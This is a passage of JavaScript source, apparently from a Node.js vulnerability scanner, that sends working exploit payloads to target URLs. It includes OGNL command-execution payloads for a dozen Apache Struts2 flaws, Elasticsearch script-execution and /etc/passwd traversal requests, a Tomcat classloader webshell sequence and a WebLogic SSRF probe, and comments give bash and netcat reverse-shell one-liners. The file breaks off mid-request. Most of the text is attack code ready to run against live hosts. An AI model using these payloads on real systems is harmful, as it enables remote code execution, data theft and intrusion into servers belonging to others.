(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))
*/
function doStruts2_029(url, fnCbk,bW)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	this.name = this.name || "message";
	var s1 = (g_postData),s = 
		// s-045不允许下面的代码
		
		"#_memberAccess['allowPrivateAccess']=true"
		+ ",#_memberAccess['allowProtectedAccess']=true"
		+ ",#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']"
		+ ",#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true"
		+ ",#_memberAccess['allowStaticMethodAccess']=true"
		// + ",(#_memberAccess['acceptProperties']=true)"
		
		// + ",(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ",("
		// s2-048不能加下面的代码
		
		
		// + ".(#_memberAccess['acceptProperties']=true)"
		// + ".("
		//,szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);

		s = "(" + s + ",#mtx=new java.lang.Boolean('false'),#context['xwork.MethodAccessor.denyMethodExecution']=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
		+ ",#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",#as.toString()"
		+")";
	// console.log(encodeURIComponent(s));
	// console.log(url);
	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
		/*
		,"formData":{"message":s}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }//*/
		})
	  , function (error, response, body){
	  		// console.log(error || body);
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-029",szOldUrl);
	  		}
	    }
	  );
}

/*
// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，
DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），
这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会
///////////*/
function doStruts2_032(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var oParms = {},s;
	// 测试证明，有些@要编码，有些不能编码
	//s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString";
	s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),"
	+ "#c=new java.lang.ProcessBuilder(#parameters.cmd[0]),#p.redirectErrorStream(true),#process=#p.start()"
	+ ",%23s%3dnew+java.util.Scanner(#process.getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString";


	//s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b555%2b12345),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=11602011"

	//console.log(encodeURIComponent(s));

	
	// oParms[s = "method:" + encodeURIComponent(s)] = "";
	// oParms["mtxtest"] = "ok";
	var n = 12345 + 555 + 11602011;
	request(fnOptHeader({method: 'GET',uri: url + "?method:" 
		+ s
	+ "&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id"// + encodeURIComponent(g_szCmd.replace(/;/gmi,"&&"))
		}),
    	function(e,r,b)
    {
    	var szTmp = String(e || b);
    	// console.log(szTmp);
    	if(-1 < szTmp.indexOf('1160201155512345'))
    		g_oRst.struts2 = {des:"发现s2-032高危漏洞","s2-032":"存在高危漏洞"};
    	else fnDoBody(b,"s2-032",szOldUrl);
    });

}

// 测试所有，便于更改url重复测试
function fnTestAll()
{
	if(!program.proxy && false !== program.host)
	fnDoHostAttack(g_szUrl,function(o)
	{
		fnLog(o);
	},null);
	var ss = "string" != typeof(program.method) && "PUT,DELETE,OPTIONS,HEAD,PATCH" || program.method;
	var aMethod = ss.split(/[,;]/);
	for(var k in aMethod)
		fnTest(aMethod[k]);
}

// 反序列化检测
// java -jar ~/safe/mtx_jfxl/jfxl.jar 192.178.10.1/24:7001
function fnCheckJavaFx(s)
{
	var szF = "~/safe/mtx_jfxl/jfxl.jar";
	child_process.exec("ls " + szF,function(e,so,se)
	{
		if(!so)
		{
			console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git\njava -jar ~/safe/mtx_jfxl/jfxl.jar " + s);

		}
		else
		{
			szF = "java -jar " + szF + " " + s;
			
			child_process.exec(szF,function(e,so,se)
			{
				szF = __dirname + "/data/" + s.replace(/:/gmi,"_") + ".txt";
				if(fs.existsSync(szF))
				{
					g_oRst.weblogic_java_des = {des:"发现weblogic【高危】java反序列化漏洞",result:szF};
				}
				if(e)fnLog(e.toString());
			});
		}
	});
	
}
// 缓存正则表达式，便于提高效率
var g_reKeys = null;

function fnCheckKeys(b)
{
	var a,s,r = [],re = /<.*?type=['"]*password['"]*\s[^>]*>/gmi, r1 = /autocomplete=['"]*(off|0|no|false)['"]*/gmi;
	g_oRst.checkKeys || (g_oRst.checkKeys = {});
	var oMp = {}, ss;
	if(!g_oRst.checkKeys.passwordInputs)
	{
		while(a = re.exec(b))
		{
			if(!r1.exec(a[0]))
			{
				ss = a[0].replace(/[\r\n\t"'']/gmi,"").replace(/\s+/gmi," ");
				if(!oMp[ss])
					oMp[ss] = 1,r.push(ss);
			}
		}
		if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
	}
	oMp = {};
	s = program.keys || "./urls/keywords";
	if(!g_oRst.checkKeys.keys && fs.existsSync(s))
	{
		a = g_reKeys || new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
		g_reKeys = a;
		re = [];
		while(s = a.exec(b))
		{
			if(!oMp[s[1]])
				oMp[s[1]]=1,re.push(s[1]);
		}
		if(0 < re.length)g_oRst.checkKeys.keys = {"des":"这些关键词在网络中容易被监听，请更换",list:re};
	}
}

var g_reServer = /(Tomcat|JBossWeb|JBoss[\-\/][\d\.]+)/gmi;

// 获取Ta3异常消息
function fnGetErrMsg(body)
{
	if(body)
	{
		body = body.toString();
		fnCheckKeys(body);
		var s1 = "Base._dealdata(", i = body.indexOf(s1);
		if(-1 < i)body = body.substr(i + s1.length);
		s1 = "});";
		i = body.indexOf(s1);
		if(-1 < i)body = body.substr(0, i + 1);
		try
		{
			if(g_reServer)
			{
				var oS = g_reServer.exec(body);
				if(oS && 0 < oS.length && g_oRst.server)g_oRst.server += " " + oS[1],g_reServer = null;
			}
			var o = JSON.parse(body = body.replace(/'/gmi,"\"").replace(/\t/gmi,"\\t\\n").replace(/&nbsp;/gmi," "));
			return o.errorDetail;
		}catch(e)
		{
			var bHv = false;
			i = body.indexOf("at com.");
			if(bHv = -1 < i)body = body.substr(i - 11);
			i = body.lastIndexOf("at ");
			if(-1 < i)bHv = true,body = body.substr(0,i);
			if(bHv)return body;
		}
	}
	return "";
}

// 避免重复处理
var g_HtmlMd5Cf = {};

function fnLog(s)
{
	if(program.verbose)console.log(s.toString());
}

// 避免重复,后期可以支持字典目录，多个字典目录，这样可以扫描更多
var g_mUrls = {};
// 检查ta3默认菜单
function fnCheckTa3(u,dict,szDes,type)
{
	var j = u.lastIndexOf('/');
	if(10 < j)u = u.substr(0, j + 1);
	else u += '/';

	fnLog("start check " + dict);
	var s = dict,a,i = 0,fnCbk = function(url)
	{
		fnLog("check " + u + url);
		
		request(fnOptHeader({method: 'GET',uri: u + url
		    ,headers:
		    {
		    	"User-Agent": g_szUa
		    }
		})
		, function (error, response, body)
		{
			if(!error && body)
			{
				var md5sum = crypto.createHash('md5');
				md5sum.update(body.toString());
				var szMd5 = md5sum.digest('hex');
				if(g_HtmlMd5Cf[szMd5])return;
				g_HtmlMd5Cf[szMd5] = 1;
				// content-length 不同来判断不同值
				// if(!response.headers['content-length'])console.log(body)
				fnDoBody(body,"ta3menus");
				if(200 === response.statusCode)
				{
					var re = /<title>([^<]*)<\/title>/gmi, t = re.exec(body);
					t && (t = t[1].trim());t || (t = "");
					var oTm = (g_oRst[type] || (g_oRst[type] = {}));
					
					oTm.des = szDes + ",这些url响应http 200";
					oTm.urls  || (oTm.urls = []);
					oTm.urls.push([u + url,t].join(","));
				}
			}
		}).on('error', function(err) {
			// console.log(err)
		});
	};
	if(fs.existsSync(s))
	{
		a = String(fs.readFileSync(s)).trim().split(/\n/);
		for(; i < a.length; i++)
		{
			if(g_mUrls[a[i]])continue;
			g_mUrls[a[i]] = true;
			// console.log(a[i]);
			fnCbk(a[i]);
		}
	}else fnLog("不存在: " + s);
}
// 全部编码为%xx格式
function fnMakeData(s)
{
	return s.replace(/./gmi,function(a)
	{
		return '%' + String(a).charCodeAt(0).toString(16);
	});
}

// java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.168.18.89:7001
/*
// console.log(fnMakeData(g_postData));
var oTmp = {
		"dto['naac002']":encodeURIComponent(g_postData),
		"dto['npassword']":encodeURIComponent(g_postData)
		};
	oTmp[encodeURIComponent(g_postData)] = "ok";
request.post(//  + encodeURIComponent(g_postData)
	{
	uri:"http://192.168.10.212:40912/queryPersonInfoAction.do",
	headers:{'Content-Type':'text/xml;charset=UTF-8'},
	formData:oTmp
	}
	,function(e,r)
	{
		if(!e)console.log(r.body);
		console.log(e);
	});
//*/

//
function doStruts2_009(url, fnCbk)
{
	this.name = this.name || "id";
	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(g_postData) + "&(" + this.name + ")('x')=1"
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-009",url);
	  		}
	    }
	  );
}
/*
如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量
<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
*/
function doStruts2_012(url, fnCbk)
{
	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
	+ ",#as=new java.lang.String()"
	+ ",#p.redirectErrorStream(true),#process=#p.start()"
	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
	+ ",#f.println(#as)"
	+ ",#f.flush()"
	+ ",#f.close()"
	+"}";
	this.name = this.name || "name";
	var oForm = {};
	oForm[this.name] = s;
	request(fnOptHeader({method: 'POST',uri: url
	    ,"formData":oForm
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  ,function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-012",url);
	  		}
	    }
	  );
}
/*
Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，
get 或 all，参考官方其对应意义如下：
none - 链接不包含请求的任意参数值（默认）
get - 链接只包含 GET 请求中的参数和其值
all - 链接包含 GET 和 POST 所有参数和其值
<s:a>用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。
   在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
*/
function doStruts2_013(url, fnCbk)
{
	// encodeURIComponent(g_postData)
	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
	+ ",#as=new java.lang.String()"
	+ ",#p.redirectErrorStream(true),#process=#p.start()"
	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
	+ ",#f.println(#as)"
	+ ",#f.flush()"
	+ ",#f.close()"
	+"}";
	this.name = this.name || "a";
	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
	    })
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-013,s2-014",url);
	  		}
	    }
	  );
	request(fnOptHeader({method: 'POST',uri: url,
		"formData":{"xt": s}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-013,s2-014",url);
	  		}
	    }
	  );
}

/*
/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
*/
function doStruts2_015(url, fnCbk)
{
	var fnC = function(szCmd,fnCbk1)
	{
		var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
		//////// 增加的关键行 start//////
		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
		+ ",#f.setAccessible(true)"
		+ ",#f.set(#_memberAccess,true)"
		//////// 增加的关键行 end//////
		// + ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
		// + ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
		+ ",#p=new java.lang.ProcessBuilder('"+szCmd+"')"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",#as='{{'+#as+'}}'"
		+ ",#as.toString()"
		+"}";
		request(fnOptHeader({method: 'GET',uri: url + encodeURIComponent(s) + ".do"
		    })
		  , function (error, response, body){
		  	// console.log(error||body);
		  		if(body)
		  		{
		  			var r = /\{\{([^\}]+)\}\}/gmi.exec(body),sR = r && r[1] || "";
		  			fnCbk1(sR.replace(/(^\s*)|(\s*$)/gmi,''));
		  			// fnDoBody(body,"s2-015",url);
		  		}else fnCbk1('');
		    }
		  );
	};
	var a = g_szCmd.split(";"),aR = [],nC = 0;
	for(var i = 0; i < a.length; i++)
	{
		if(-1 < a[i].indexOf("echo")){nC++;continue;}
		(function(n)
		{
			fnC(a[n],function(s)
			{
				console.log(s);
				aR[n] = s;
				nC++;
			})
		})(i);
	}
	var nT = setInterval(function()
	{
		if(nC == a.length)
		{
			clearInterval(nT);
			// console.log("kkkk:" +aR.join('') + "kkk");
			fnDoBody(aR.join("\n"),"s2-015",url);
		}
	},13);
}

// /robots.txt
/*
 "action:", "redirect:", "redirectAction:" 
/default.action?redirect:
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
// bash -i >& /dev/tcp/192.168.24.90/4444 0>&1
// s2_016,s2_017
//////////*/
function doStruts2_016(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
		//////// 增加的关键行 start//////
		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
		+ ",#f.setAccessible(true)"
		+ ",#f.set(#_memberAccess,true)"
		//////// 增加的关键行 end//////
		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
		+ ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),#as=new java.lang.String(#e,0,#i)" 
		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		// + ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		//+ ",#as=(@java.net.URLEncoder@encode(#as,'UTF-8'))"
		// + ",#as='{{'+#as+'}}'"
		+ ",#as.toString()"
		+"}";
	var oR = fnOptHeader({method: 'GET',uri: url + "?redirectAction:" + encodeURIComponent(s)
		});
	oR.followAllRedirects = oR.followRedirect=true;
	request(oR,
    	function(e,r1,b)
    {
    	// var r = /\{\{([^\}]+)\}\}/gmi.exec(b.toString()),sR = r && r[1] || "";
    	// console.log(e || b);
    	if(!e)fnDoBody(e||b,"s2-016",szOldUrl);
    });
}

/*
一行反弹shell:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
*/
function doStruts2_007(url, fnCbk)
{
	var s = "'+(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+")+'";
	this.name = this.name || "age";
	var oForm = {name:1,email:1};
	oForm[this.name] = s;
	request(fnOptHeader({method: 'POST',uri: url,//  + "?name=1&email=1&age=" + encodeURIComponent(s)
		"formData":oForm
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			body = body.replace(/\u0000/gmi, '');
	  			// console.log(body);
	  			fnDoBody(body,"s2-007",url);
	  		}
	    }
	  );
}

function doStruts2_008(url, fnCbk)
{
	var s = "(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
	+ ",#as=new java.lang.String()"
	+ ",#p.redirectErrorStream(true),#process=#p.start()"
	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+")";
	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" + encodeURIComponent(s)
	    })
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-008",url);
	  		}
	    }
	  );
}

// Tomcat 8下导致RCE
function doStruts2_020(url, fnCbk)
{
	var a = [
		"?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
		"?class.classLoader.resources.context.parent.pipeline.first.prefix=shell",
		"?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
		"?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1",
		"?a=<%Runtime.getRuntime().exec(\"calc\");%>",
		"shell1.jsp"];
	request(fnOptHeader({method: 'GET',uri: url + "?a=" + encodeURIComponent(g_postData)
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-020",url);
	  		}
	    }
	  );
}

/* 暂未实现：
https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2015-5531
https://github.com/phith0n/vulhub/tree/master/elasticsearch/WooYun-2015-110216
////////*/
function elasticsearch(url,fnCbk,aData,t,urlr)
{
	var s = url, i = url.lastIndexOf('/',10), s1,s2,s4,s5,oData = 
		{
			"size":1,
			"query":
				{"filtered":
					{"query":
						{"match_all":""}
					}
				},
			"script_fields":
			{
				"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}
			}
		},
		szDes = "发现" + (t || 'CVE-2014-3120') + " elasticsearch漏洞" + (urlr || "https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2014-3120")
		,fnDRst = function(s)
		{
			if(s && -1 < s.indexOf("uid="))
			{
				g_oRst.elasticsearch || (g_oRst.elasticsearch = []);
				g_oRst.elasticsearch.push({des:szDes,r:s});
			}
		};
	if(0 < i)s = s.substr(0, i);
	s1 = s + "/_search?pretty";
	s4 = s + "/_plugin/head/../../../../../../../../../../../../../../../../../etc/passwd";
	request(fnOptHeader({method:"POST",uri:s1,headers:
	{
		"content-type": "application/x-www-form-urlencoded",
		"user-agent":g_szUa
	},body:aData||JSON.stringify(oData)}),function(e,r,b)
	{
		if(b && 200 == r.statusCode)
		{
			fnDRst(b);
		}
	});

	i = url.indexOf('/',10)
	if(0 < i)s = s.substr(0, i);
	s2 = s + "/_search?pretty";
	s5 = s + "/_plugin/head/../../../../../../../../../../../../../../../../../etc/passwd";
	if(s2 != s1)
	{
		request(fnOptHeader({method:"POST",uri:s2,headers:
		{
			"content-type": "application/x-www-form-urlencoded","user-agent":g_szUa
		},body:aData||JSON.stringify(oData)}),function(e,r,b)
		{
			if(b && 200 == r.statusCode)
			{
				fnDRst(b);
			}
		});
	}
	if(!aData)
	{
		elasticsearch(url,null,'{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}','CVE-2015-3120','https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2015-1427');
		var fnCbk1 = null;
		request(fnOptHeader({method:"GET",uri:s4}),fnCbk1 = function(e,r,b)
		{
			if(b && 200 == r.statusCode)
			{
				if(-1 < b.indexOf("root:"))
					g_oRst.elasticsearch.push({"des":"发现CVE-2015-3337漏洞，https://github.com/phith0n/vulhub/tree/master/elasticsearch/CVE-2015-3337"});
			}
		});
		if(s4 != s5)request(fnOptHeader({method:"GET",uri:s5}),fnCbk1);
	}
}

// weblogic uddiexplorer测试
function testWeblogic(url,fnCbk)
{
	var s = url, i = url.indexOf('/',10), szCs,szCs2;
	if(0 < i)s = s.substr(0, i);
	szCs = s + "/console/"
	szCs2 = s + "/manager/"
	
	s += "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001";
	// console.log(s)
	request(fnOptHeader({method:"GET",uri:s}),function(e,r,b)
	{
		if(b && 200 == r.statusCode && -1 < b.indexOf("weblogic.uddi.client"))
		{
			g_oRst.weblogic = {uddiexplorer:"发现uddiexplorer可访问，且存在SSRF漏洞"};
		}

	});
	request(fnOptHeader({method:"GET",uri:szCs}),function(e,r,b)
	{
		if(r && 200 == r.statusCode)
		{
			g_oRst.weblogic = {console:"发现console可访问，不符合安全规范要求，建议关闭、设置访问限制"};
		}
	});
	request(fnOptHeader({method:"GET",uri:szCs2}),function(e,r,b)
	{
		if(r && 200 == r.statusCode && -1 < String(b).indexOf("manager"))
		{
			g_oRst.tomcat = {console:"发现manager可访问，不符合安全规范要求，建议关闭、设置访问限制"};
		}
	});
}

/*
POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/xml
Content-Length: 1663
Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit
Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7
Connection: close
Upgrade-Insecure-Requests: 1

<map> 
<entry> 
